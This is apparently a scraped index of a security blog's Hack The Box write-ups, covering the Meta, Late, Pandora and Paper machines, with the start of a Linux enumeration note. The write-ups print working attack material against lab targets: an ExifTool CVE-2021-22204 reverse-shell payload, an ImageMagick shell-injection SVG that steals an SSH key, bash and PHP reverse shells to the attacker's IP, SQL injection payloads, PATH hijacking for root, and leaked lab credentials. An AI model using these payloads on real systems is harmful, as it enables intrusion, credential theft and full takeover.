13.25 secondsIf we enter the website through the IP, it will redirect us to artcorp.htb which we will have to add to the hosts file. Server Not FoundTo add it to the hosts file we use the following command:❯ echo &quot;10.10.11.140 artcorp.htb&quot; | sudo tee -a /etc/hostsFuzzingNow we will fuzz the directories using ffuf.❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://artcorp.htb/FUZZ -c -ic /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://artcorp.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________assets [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 52ms] [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 3372ms]css [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 94ms] [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 87ms]:: Progress: [87651/87651] :: Job [1/1] :: 310 req/sec :: Duration: [0:03:12] :: Errors: 0 :: There are no directories of interest in the domain…Seeing that there are no interesting directories on the domain, we’ll check if it has subdomains again with ffuf.❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://artcorp.htb -H &quot;Host: FUZZ.artcorp.htb&quot; -ic -c -ac /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://artcorp.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________dev01 [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 61ms]:: Progress: [4989/4989] :: Job [1/1] :: 509 req/sec :: Duration: [0:00:13] :: Errors: 0 :: We found the subdomain dev01To add it to the hosts file we use the following command:❯ echo &quot;10.10.11.140 dev01.artcorp.htb&quot; | sudo tee -a /etc/hostsSubdomainThis is the website of the subdomain. You have a link to an application under development.Subdomain websiteWhen entering the metaview directory we find an image metadata reader. If we introduce any image we notice that it returns the following:Metaview directory It looks like the output of exiftool…FootholdExploitWe will use searchsploit to see if there is an exploit for exiftool. We realize that in fact, there is.❯ searchsploit exiftool----------------------------------------------------------------- --------------------------------- Exploit Title | Path----------------------------------------------------------------- ---------------------------------ExifTool 12.23 - Arbitrary Code Execution | linux/local/50911.py----------------------------------------------------------------- ---------------------------------The first step would be to see how the exploit works and to obtain some useful information from CVE-2021-22204.❯ python /usr/share/exploitdb/exploits/linux/local/50911.pyUNICORD Exploit for CVE-2021-22204Usage: python3 exploit-CVE-2021-22204.py -c &amp;lt;command&amp;gt; python3 exploit-CVE-2021-22204.py -s &amp;lt;local-IP&amp;gt; &amp;lt;local-port&amp;gt; python3 exploit-CVE-2021-22204.py -c &amp;lt;command&amp;gt; [-i &amp;lt;image.jpg&amp;gt;] python3 exploit-CVE-2021-22204.py -s &amp;lt;local-IP&amp;gt; &amp;lt;local-port&amp;gt; [-i &amp;lt;image.jpg&amp;gt;] python3 exploit-CVE-2021-22204.py -hOptions: -c Custom command mode. Provide command to execute. -s Reverse shell mode. Provide local IP and port. -i Path to custom JPEG image. (Optional) -h Show this help menu. This exploit needs djvulibre-bin and exiftool packagesIn “help” we can see that using the -s option generates a payload with a reverse shell.❯ python /usr/share/exploitdb/exploits/linux/local/50911.py -s 10.10.16.10 4444 _ __,~~~/_ __ ___ _______________ ___ ___ ,~~`( )_( )-\\| / / / / |/ / _/ ___/ __ \\/ _ \\/ _ \\ |/| `--. / /_/ / // // /__/ /_/ / , _/ // /_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/.... RUNNING: UNICORD Exploit for CVE-2021-22204PAYLOAD: (metadata &quot;\\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));i.16.10&#39;)))){open(STDIN,&#39;&amp;gt;&amp;amp;S&#39;);open(STDOUT,&#39;&amp;gt;&amp;amp;S&#39;);open(STDERR,&#39;&amp;gt;&amp;amp;S&#39;);exec(&#39;/bin/sh -i&#39;);}RUNTIME: DONE - Exploit image written to &#39;image.jpgIn “netcat” which we would have previously left listening, we see how it has worked out and we will be inside as the user www-data.❯ nc -nlvp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.11.140] 33878/bin/sh: 0: can&#39;t access tty; job control turned off$ Interactive shell with script /dev/null -c bash and use export TERM=xterm to not be so restricted.User AccessAfter doing a basic enumeration and not finding anything. I decided to use pspy64 to see what processes are running in the background and who is running them.We found a running script with imagemagick in it and mogrify.pspy64Then the following is executed, where we see that the root user empties the directory /var/www/dev01.artcorp.htb/convert_images/pspy64Searching for ways to exploit those processes that were running on the background which seemed to be in crontab, I found the following:Shell injectionIntroducing this payload in the place where it is executed would be a matter of waiting.&amp;lt;image authenticate=&#39;ff&quot; `echo $(cat /home/thomas/.ssh/id_rsa)&amp;gt; /dev/shm/0wned`;&quot;&#39;&amp;gt; &amp;lt;read filename=&quot;pdf:/etc/passwd&quot;/&amp;gt; &amp;lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&amp;gt; &amp;lt;resize geometry=&quot;400x400&quot; /&amp;gt; &amp;lt;write filename=&quot;test.png&quot; /&amp;gt; &amp;lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&amp;gt; &amp;lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&amp;gt; &amp;lt;/svg&amp;gt;&amp;lt;/image&amp;gt;We downloaded the image by setting up a web server with python on our host and using wget on the victim machine pointing to the file.www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ wget 10.10.16.10:8000/poc.svg--2022-06-04 06:34:06-- http://10.10.16.10:8000/poc.svgConnecting to 10.10.16.10:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 428 [image/svg+xml]Saving to: &#39;poc.svg&#39;poc.svg 100%[===================&amp;gt;] 428 --.-KB/s in 0s 2022-06-04 06:34:07 (44.8 MB/s) - &#39;poc.svg&#39; saved [428/428]After a while we will have the file with the output of the command carried out, in this case we have the content of the user’s id_rsa.www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/0wnedcat /dev/shm/0wned-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1...XJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY-----And we would already be inside the machine as the user with UID 1000.❯ ssh -i id_rsa thomas@artcorp.htbLinux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Jun 4 07:10:47 2022 from 10.10.16.10thomas@meta:~$ Privilege EscalationI was lucky on the escalation because the first thing I usually do is sudo -l and it rarely gives me anything interesting but this time it didn’t.We see how /usr/bin/neofetch \\&quot;\\&quot; can be used without a password. On the other hand we have the environment variable of the configuration directory.We set the variable to the user’s .config directory and insert a reverse shell into the neofetch configuration file. Now all we have to do is run sudo /usr/bin/neofetch \\&quot;\\&quot;.thomas@meta:~$ sudo -lMatching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOMEUser thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\&quot;\\&quot;thomas@meta:~$ export XDG_CONFIG_HOME=/home/thomas/.configthomas@meta:~$ echo &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.10/4444 0&amp;gt;&amp;amp;1&quot; &amp;gt;&amp;gt; .config/neofetch/config.confthomas@meta:~$ sudo /usr/bin/neofetch \\&quot;\\&quot;And we will have access to the system as a root user.❯ nc -nlvp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.11.140] 47112root@meta:/home/thomas# ididuid=0(root) gid=0(root) groups=0(root)ConclusionIt is a machine that is “easy” considering that it is of medium difficulty. I guess the difficulty is higher for the downstream user (www-data). I had not dealt with images for this type of processes and I find it interesting.Techniques and Tools rustscan (implement nmap) ffuf CVE-2021-22204 RCE (Remote Code Execution) PE (Privilege Escalation)" }, { "title": "[HTB] Late", "url": "/machines/htb/late", "categories": "Machines, HTB", "tags": "easy, linux, machines, flask", "date": "2022-05-29 20:45:00 +0200", "snippet": "EnumerationNMAP❯ nmap -sV --open 10.10.11.156Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:19 CESTNmap scan report for 10.10.11.156Host is up (0.084s latency).Not shown: 961 closed tcp ports (conn-refused), 37 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds We see that port 80 and 22 are open, so we have to go to the website.DomainsWhen we enter the website and look at the source code find this: Source code website❯ echo &quot;10.10.11.156 late.htb images.late.htb&quot; | sudo tee -a /etc/hostsIf we take a look at the domain we will see that there is nothing interesting. Domain websiteOn the subdomain we have an image to text conversor. This website uses Flask, after doing some research I know what I need to do. Subdomain websiteFootholdFlask injectionTo begin with I’m going to test if this vulnerability works. Using list internal flask configurations, we will give it a try.First imageAfter uploading the image we download a txt file with the result. This image gives us the following result, which confirms that it is vulnerable to Flask injection.First resultFollowing the instructions from the website that explained the Flask injection, we can do RCE.Second imageSeeing the file /etc/passwd we can figure out that the username to later start an ssh session with this.Second resultNow we just extract the OpenSSH private key and we can login.Final imageHere is the id_rsa file.Final resultSSH❯ ssh -i id_rsa user@late.htbuser@late:~$ iduid=1000(user) gid=1000(user) groups=1000(user)user@late:~$ Privilege EscalationIf we use linpeas, we can see that in /usr/local/sbin we have a high PE vector. linpeas outputIf we go to the directory, there is a script with execute permissions.Well, they make it easy for us. We introduce a reverse shell in the script and then ssh to localhost to trigger the script, since it is a script that alerts of ssh logins.user@late:/usr/local/sbin$ ls -ltotal 4-rwxr-xr-x 1 user user 433 Jun 4 09:46 ssh-alert.shuser@late:/usr/local/sbin$ echo &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.10/4444 0&amp;gt;&amp;amp;1&#39; &amp;gt;&amp;gt; ssh-alert.sh ; ssh localhostWhile the netcat is active and when we have used the previous command we will already be inside the root user.❯ nc -nlvp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.11.156] 60668bash: cannot set terminal process group (27514): Inappropriate ioctl for devicebash: no job control in this shellroot@late:/# ididuid=0(root) gid=0(root) groups=0(root)ConclusionThis machine itself is not difficult but Flask injection makes it a bit difficult. I had to test the injection with many formats, many times, since the app didn’t read it well. Other than that, it is an easy machine.Techniques and Tools nmap linpeas Flask injection RCE (Remote Code Execution) PE (Privilege Escalation)" }, { "title": "[HTB] Pandora", "url": "/machines/htb/pandora", "categories": "Machines, HTB", "tags": "easy, linux, snmpwalk, sqlmap, machines", "date": "2022-05-23 18:25:00 +0200", "snippet": "EnumerationNMAP❯ nmap -sV -Pn 10.10.11.136Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:20 EDTNmap scan report for Panda.HTB (10.10.11.136)Host is up (0.15s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds We see port 80 and 22 are open, so we have to go to the website.DomainWhen we enter to the website this is what we see: We add the domain _panda.htb_ on hosts file and enter to the websiteNMAPI come back to nmap because I tried to find subdomains or directories with knock and ffuf, but found nothing. This time I use an UDP scan.❯ sudo nmap -sU -top-ports=20 --open panda.htbStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:53 EDTNmap scan report for panda.htb (10.10.11.136)Host is up (0.061s latency).rDNS record for 10.10.11.136: Panda.HTBNot shown: 13 closed udp ports (port-unreach)PORT STATE SERVICE123/udp open|filtered ntp161/udp open snmp162/udp open|filtered snmptrap631/udp open|filtered ipp1900/udp open|filtered upnp4500/udp open|filtered nat-t-ike49152/udp open|filtered unknownNmap done: 1 IP address (1 host up) scanned in 7.90 seconds So many ports open|filtered but only one open, this is the snmp port.Let’s look at some information about that port.❯ sudo nmap -sU -sV -p 161 panda.htbStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 14:01 EDTNmap scan report for panda.htb (10.10.11.136)Host is up (0.059s latency).rDNS record for 10.10.11.136: Panda.HTBPORT STATE SERVICE VERSION161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)Service Info: Host: pandoraService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds We need to remember public because it is the community string.SNMPInvestigating a little bit I found a tool in this website called snmpwalk.snmpwalk -c public -v1 panda.htb | tee snmpwalk1Now let’s see the snmpwalk1 file....iso.3.6.1.2.1.25.4.2.1.5.876 = STRING: &quot;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&quot;iso.3.6.1.2.1.25.4.2.1.5.880 = STRING: &quot;-f&quot;... Ohhh, we see an user and a password here!FootholdSSHThe latest credentials seems to work for the ssh, let’s try:❯ ssh daniel@10.10.11.136daniel@10.10.11.136&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage...Last login: Tue May 17 18:27:07 2022 from 10.10.16.21daniel@pandora:~$ And… we are in!The first thing is an nmap to discover what services are running in here:daniel@pandora:~$ nmap localhostStarting Nmap 7.80 ( https://nmap.org ) at 2022-05-17 18:41 UTCNmap scan report for localhost (127.0.0.1)Host is up (0.000059s latency).Other addresses for localhost (not scanned): ::1rDNS record for 127.0.0.1: localhost.localdomainNot shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http3306/tcp open mysqlNmap done: 1 IP address (1 host up) scanned in 0.05 seconds There is a website and a database in here…Taking a look at the configuration of the website can also be helpful:daniel@pandora:~$ cat /etc/apache2/sites-enabled/pandora.conf &amp;lt;VirtualHost localhost:80&amp;gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt &amp;lt;Directory /var/www/pandora&amp;gt; AllowOverride All &amp;lt;/Directory&amp;gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined&amp;lt;/VirtualHost&amp;gt; There seems to be an user called matt:daniel@pandora:~$ ls /home/matt/tar user.txtdaniel@pandora:~$ cat /home/matt/user.txt cat: /home/matt/user.txt: Permission denied In matt home we see the FLAG user!Port_forwardingWe need to see that website on a browser, so let’s do port forwarding with ssh.In order to do this we need to follow the following command: ssh -L local_port:dest_server_ip:remote_port ssh_server_hostnameFor this case, it is like this: ssh -L 8080:localhost:80 daniel@10.10.11.136Now we can see the website in our browser. Login PandoraFMSVulnerabilitySearching for PandoraFMS I found this SQL injection vulnerability: CVE-2021-32099: A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass.Let’s try this with sqlmap:❯ sqlmap --url &quot;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; ___ __H__ ___ ___[)]_____ ___ ___ {1.6.5#stable}|_ -| . [)] | .&#39;| . ||___|_ [&quot;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org[*] starting @ 15:11:24 /2022-05-17/...GET parameter &#39;session_id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:---Parameter: session_id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: session_id=-9717&#39; OR 2914=2914# Type: error-based Title: MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: session_id=&#39;&#39;&#39; OR (SELECT 5582 FROM(SELECT COUNT(*),CONCAT(0x717a7a6b71,(SELECT (ELT(5582=5582,1))),0x71716a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qXuw Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: session_id=&#39;&#39;&#39; AND (SELECT 6429 FROM (SELECT(SLEEP(5)))KdsF)-- bkmF---...[*] ending @ 15:18:00 /2022-05-17/ Is vulnerable!SQL TablesWith this vulnerability we can see others tables of the database. Let’s have a look at the tables of pandora database.❯ sqlmap --url &quot;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; -D pandora --tablesDatabase: pandora[178 tables]+------------------------------------+| ... || tnotification_source_user || tnotification_user || torigen || tpassword_history || tperfil || tphase || tplanned_downtime || tplanned_downtime_agents || tplanned_downtime_modules || tplugin || tpolicies || tpolicy_agents || tpolicy_alerts || tpolicy_alerts_actions || tpolicy_collections || tpolicy_groups || tpolicy_modules || tpolicy_modules_inventory || tpolicy_plugins || tpolicy_queue || tprofile_view || tprovisioning || tprovisioning_rules || trecon_script || trecon_task || trel_item || tremote_command || tremote_command_target || treport || treport_content || treport_content_item || treport_content_item_temp || treport_content_sla_com_temp || treport_content_sla_combined || treport_content_template || treport_custom_sql || treport_template || treset_pass || treset_pass_history || tserver || tserver_export || tserver_export_data || tservice || tservice_element || tsesion || tsesion_extended || tsessions_php || tskin || ... |+------------------------------------+ We need to see the tpassword_history and tsessions_php table!❯ sqlmap --url &quot;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; -T tpassword_history --dumpDatabase: pandoraTable: tpassword_history[2 entries]id_user -&amp;gt; matt ; password -&amp;gt; f655f807365b6dc602b31ab3d6d43accid_user -&amp;gt; daniel; password -&amp;gt; 76323c174bd49ffbbdedf678f6cc89a6 I changed the table to make it look good. However, nothing is taken out of these hashes, I have gone through crackstation and does not return anything.❯ sqlmap --url &quot;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; -T tsessions_php --dumpDatabase: pandoraTable: tsessions_php[50 entries]...id_session -&amp;gt; avkp2qo6r8237spa3ohavnml52; id_usuario -&amp;gt; adminid_session -&amp;gt; g4e01qdgk36mfdh90hvcc54umq; id_usuario -&amp;gt; mattid_session -&amp;gt; hsftvg6j5m3vcmut6ln6ig8b0f; id_usuario -&amp;gt; admin... I changed this table too, we just need to focus on admin and matt user.Matt accessI tried with admin session but it didn’t work. Now changing session_id to g4e01qdgk36mfdh90hvcc54umq we enter like matt. matt sessionHmmm, if there is any way to upload files, we can upload a reverse shell to get access to the system.There is not any fast method to get this working but… Searching for a script to do that I found this one.This script is able to get us an admin session_id and upload a webshell, but it is giving me some problems.❯ python exploit.py -t 127.0.0.1:8080 -f shell.phpURL: http://127.0.0.1:8080/pandora_console[+] Sending Injection Payload[+] Requesting Session[+] Admin Session Cookie : 7pcmj1a43s35m1u6903br8213a[+] Sending Payload [+] Respose : 200[+] Pwned :) We are IN!Admin accessWell, now, we need to get a bash shell… After searching for a long time to get one I aam not able to do, so let’s get into admin session on the website.Ok, it works! admin sessionReverse shellNow that we are admin, we can upload files. We just search for a working webshell like this, download and upload to the system. webshell uploaded This is going well…Finally, I get a bash shell with nc -lnvp &amp;lt;port&amp;gt; listening in my case 9042 port, and executing on the web shell this:php -r &#39;$sock=fsockopen(&quot;10.10.16.40&quot;,9042);exec(&quot;/bin/bash -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;Is time to look into binaries with suid set. We just do find / -perm -u=s -type f 2&amp;gt;/dev/null and we see /usr/bin/at on the list. So let’s go to gtfobins and look for at.We see with echo &quot;/bin/sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&quot; | at now; tail -f /dev/null we can get a unrestricted shell. Let’s try…❯ nc -lnvp 9042listening on [any] 9042 ...connect to [10.10.16.40] from (UNKNOWN) [10.10.11.136] 58356bash: cannot set terminal process group (820): Inappropriate ioctl for devicebash: no job control in this shellmatt@pandora:/var/www/pandora/pandora_console/images$ echo &quot;/bin/bash &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&quot; | sudo /usr/bin/at now; tail -f /dev/null&amp;lt;2&amp;gt;$(tty)&quot; | sudo /usr/bin/at now; tail -f /dev/null sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permittedsudo: unable to initialize policy pluginbash: [12152: 1 (255)] tcsetattr: Inappropriate ioctl for device*- This is not working…ExploitThere’s other interesting binary called pandora_backup and have SUID bit.When we execute it, it gives us:tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission deniedPandoraFMS Backup UtilityNow attempting to backup PandoraFMS clientBackup failed!Check your permissions!In order to fix this, I create an executable “tar”, and then add the path of this executable.matt@pandora:~$ echo &quot;/bin/bash&quot; &amp;gt; tarmatt@pandora:~$ chmod +x tarmatt@pandora:~$ export PATH=$(pwd):$PATHmatt@pandora:~$ /usr/bin/pandora_backup PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clientroot@pandora:~# I really need help in this part, and I also need to move netcat to ssh because the shell was blocking everything from me…NC to SSHThis is how it is done:**netcat**$ ssh-keygen -t rsa$ cat id_rsa.pub &amp;gt; authorized_keys**our machine**# copy the content of id_rsa$ ssh -i id_rsa matt@10.10.11.136CONCLUSIONThis machine is much more difficult than Paper. The shell was giving me many problems, and I wasted a lot of time on that. My solution possibly is not the easiest one, but I’m still learning and gettin better.Techniques and Tools nmap snmpwalk sqlmap RCE (Remote Code Execution) PE (Privilege Escalation)" }, { "title": "[HTB] Paper", "url": "/machines/htb/paper", "categories": "Machines, HTB", "tags": "easy, wpscan, wordpress, linux, machines", "date": "2022-05-15 02:24:00 +0200", "snippet": "EnumerationNMAP┌──(kali㉿kali)-[~]└─$ nmap -sV 10.10.11.143Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 05:07 EDTNmap scan report for 10.10.11.143Host is up (0.045s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.24 seconds We see port 80 open, so then we have to go to the website and see that it is a default Apache in CentOS.DomainAfter doing some research I found a header a little suspicious on the Network Monitor. Suspicious X-Backend-Server headerThat is a domain for sure, but when we navigate, we have a 404 error… I figured out that the only thing to do is add the domain to /etc/hosts and see what happens. Wappalyzer extension When we enter into the website, Wappalyzer told us it is a WordPress page. So let’s take a look with WPScan.WPScan┌──(kali㉿kali)-[~]└─$ wpscan --url http://office.paper_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[i] Updating the Database ...[i] Update completed.[+] URL: http://office.paper/ [10.10.11.143][+] Started: Sun May 15 05:24:33 2022Interesting Finding(s):[+] Headers | Interesting Entries: | - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | - X-Powered-By: PHP/7.2.24 | - X-Backend-Server: office.paper | Found By: Headers (Passive Detection) | Confidence: 100%[+] WordPress readme found: http://office.paper/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). Version 5.2.3 is vulnerable!VulnerabilitySearching for vulnerabilities of the WordPress version I found one which shows hidden posts.┌──(kali㉿kali)-[~]└─$ searchsploit WordPress 5.2.3 ------------------------------------------------------------------------------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------WordPress Core 5.2.3 - Cross-Site Host Modification                | php/webapps/47361.plWordPress Core &amp;lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.mdIf we take a look into the second vulnerability…So far we know that adding `?static=1` to a wordpress URL should leak its secret contentHere are a few ways to manipulate the returned entries:- `order` with `asc` or `desc`- `orderby`- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date formatIn this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&amp;amp;order=asc` will show the secret content:FootholdOn http://office.paper/?static=1 an article named test appears. There is one text that stands out:# Secret Registration URL of new Employee chat systemhttp://chat.office.paper/register/8qozr226AhkCHZdyYSo now, we add the domain to /etc/hosts and navigate into the website, register and login.Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.Most frequently asked questions include:- What time is it?- What new files are in your sales directory?- Why did the salesman crossed the road?- What&#39;s the content of file x in your sales directory? etc.Please note that I am a beta version and I still have some bugs to be fixed.How to use me ? :1. Small Talk:You can ask me how dwight&#39;s weekend was, or did he watched the game last night etc.eg: &#39;recyclops how was your weekend?&#39; or &#39;recyclops did you watched the game last night?&#39; or &#39;recyclops what kind of bear is the best?2. Joke:You can ask me Why the salesman crossed the road.eg: &#39;recyclops why did the salesman crossed the road?&#39;&amp;lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&amp;gt;For security reasons, the access is limited to the Sales folder.3. Files: eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file src/test.php&#39; or just &#39;recyclops file test.txt&#39;4. List: You can ask me to list the files5. Time: You can ask me to what the time iseg: &#39;recyclops what time is it?&#39; or just &#39;recyclops time&#39; We see a bot inside the general chat after login. The general chat is read-only so let’s talk to the bot privately.Then we use file and list command in the bot chat to access to the system. There is a user.txt but we don’t have access to it. We need another method to enter the system… file ../user.txt Access denied.After looking for something I finally found something interesting: &amp;lt;!=====Contents of file ../hubot/.env=====&amp;gt;export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39;export ROCKETCHAT_USER=recyclopsexport ROCKETCHAT_PASSWORD=Queenofblad3s!23export ROCKETCHAT_USESSL=falseexport RESPOND_TO_DM=trueexport RESPOND_TO_EDITED=trueexport PORT=8000export BIND_ADDRESS=127.0.0.1 I tried to login with this credentials into ssh but it is incorrect. Let’s see the users on /etc/passwd. This 2 users have /bin/bash as shell…rocketchat:1001:1001::/home/rocketchat:/bin/bashdwight:1004:1004::/home/dwight:/bin/bash With the second user we have login into the system via SSH!Let’s see the user.txt file! And here is the FLAG.System ownTo get root permissions we only need to execute the file on home named exp.py.[root@paper ~]# whoami;idrootuid=0(root) gid=0(root) groups=0(root) Now we got ROOT!For the root FLAG we go to personal directory of root and see root.txt.ConclusionIt is a machine that, for people who are starting out, is very good. The use of the bot to get the credentials was interesting. This is the first of many!" }, { "title": "[Notes] Linux Enumeration Guide", "url": "/notes/forensics/linux-enumeration-guide", "categories": "Notes, Forensics", "tags": "forensics, enumeration, guide, linux", "date": "2022-05-11 21:31:32 +0200", "snippet": "Initial Information GatheringBasic InformationYou can start extracting some basic information:date #Date and timeuname -a #OS infoifconfig -a || ip a #Network interfaces ps -ef #Running processesnetstat -anp #Proccess and portslsof -V #Open filesnetstat -rn; route #Routing tabledf; mount #Free space and mounted devicesfree #Meam and swap spacew #Who is connectedlast -Faiwx #Loginslsmod #What is loadedSuspicious informationWhile obtaining the basic information you should check for weird things like: root processes usually run with low PIDS, so if you find a root process with a big PID you may suspect Check 